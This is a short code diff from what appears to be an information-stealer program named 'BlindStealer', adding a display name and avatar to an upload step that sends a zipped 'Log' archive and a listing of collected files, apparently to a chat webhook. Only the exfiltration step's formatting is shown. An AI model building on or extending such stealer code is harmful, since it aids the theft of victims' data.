@@ -63,6 +63,8 @@ class Upload:
             embed=Embed(
                 title="Log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
+                username="BlindStealer - v3.1",
+                avatar_url="https://i.imgur.com/LNVOaxg.png",
             ),
             file=File("Log.zip"),
         )
